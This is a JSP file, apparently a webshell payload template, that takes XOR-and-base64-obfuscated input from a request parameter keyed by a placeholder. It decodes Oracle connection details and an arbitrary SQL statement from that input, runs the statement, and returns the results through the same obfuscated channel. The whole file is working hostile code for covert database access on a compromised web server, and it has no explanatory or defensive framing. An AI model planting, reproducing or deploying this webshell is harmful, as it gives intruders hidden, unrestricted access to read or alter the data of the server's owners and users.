<%@page import="java.sql.*" contentType="text/html;charset=UTF-8"%>
<%!
    private String base64Encode(byte[] str) {
        String value = null;
        try {
            Class Base64 = Class.forName("sun.misc.BASE64Encoder");
            Object Encoder = Base64.getDeclaredConstructor().newInstance();
            value =  (String) Encoder.getClass().getMethod("encode", byte[].class).invoke(Encoder, str);
        } catch (Exception e) {
            try {
                Class Base64 = Class.forName("java.util.Base64");
                Object Encoder = Base64.getMethod("getEncoder", new Class[0]).invoke(Base64);
                value = (String) Encoder.getClass().getMethod("encodeToString", byte[].class).invoke(Encoder, str);
            } catch (Exception ee) {}
        }
        return value;
    }
    private byte[] base64Decode(String str) {
        byte[] value = null;
        try {
            Class clazz = Class.forName("sun.misc.BASE64Decoder");
            value = (byte[]) clazz.getMethod("decodeBuffer", String.class).invoke(clazz.newInstance(), str);
        } catch (Exception e) {
            try {
                Class clazz = Class.forName("java.util.Base64");
                Object decoder = clazz.getMethod("getDecoder").invoke(null);
                value = (byte[]) decoder.getClass().getMethod("decode", String.class).invoke(decoder, str);
            }catch (Exception ee) {}
        }
        return value;
    }

    private byte[] xorWithKey(byte[] a, byte[] key) {
        byte[] out = new byte[a.length];
        for (int i = 0; i < a.length; i++) {
            out[i] = (byte) (a[i] ^ key[i % key.length]);
        }
        return out;
    }

    private String executeSQL(String[] conn, String columnsep, String rowsep, boolean needcoluname) throws Exception {
        String ret = "";
        Class.forName("oracle.jdbc.driver.OracleDriver");
        String url = String.format("jdbc:oracle:thin:@%s/%s",conn[0], conn[3]);
        Connection c = DriverManager.getConnection(url,  conn[1],  conn[2]);
        Statement stmt = c.createStatement();
        boolean isRS = stmt.execute(new String(base64Decode(conn[4])));
        if (isRS) {
            ResultSet rs = stmt.getResultSet();
            ResultSetMetaData rsmd = rs.getMetaData();
            if (needcoluname) {
                for (int i = 1; i <= rsmd.getColumnCount(); i++) {
                    String columnName = rsmd.getColumnName(i);
                    ret += columnName + columnsep;
                }
                ret += rowsep;
            }

            while (rs.next()) {
                for (int i = 1; i <= rsmd.getColumnCount(); i++) {
                    String columnValue = rs.getString(i);
                    ret += columnValue + columnsep;
                }
                ret += rowsep;
            }
        } else {
            //ret += "Result" + columnsep + rowsep;
            int rowCount = stmt.getUpdateCount();
            if (rowCount > 0) {
                ret += "Rows changed = " + rowCount + columnsep + rowsep;
            } else if (rowCount == 0) {
                ret += "No rows changed or statement was DDL command" + columnsep + rowsep;
            } else {
                ret += "False" + columnsep + rowsep;
            }
        }
        return ret;
    }

    public String query(String[] conn) throws Exception {
        String columnsep = "\t|\t";
        String rowsep = "\r\n";
        return executeSQL(conn,columnsep, rowsep, false);
    }

    public String decode(String str, String key){
        return new String(xorWithKey(base64Decode(str),key.getBytes()));
    }
    public String encode(String str, String key){
        return base64Encode(xorWithKey(str.getBytes(), key.getBytes()));
    }
%>
<%
    response.setContentType("text/html");
    request.setCharacterEncoding("UTF-8");
    response.setCharacterEncoding("UTF-8");
    StringBuffer output = new StringBuffer("");
    String key = "{KeyString}";
    String funccode = request.getParameter(key);
    if(funccode != null){
        try {
            String[] pars = decode(funccode,key).split("\\|");
            output.append(query(pars));
        } catch (Exception e) {
            output.append("ERROR://" + e.toString());
        }
    }
    out.print(encode(output.toString(),key));
%>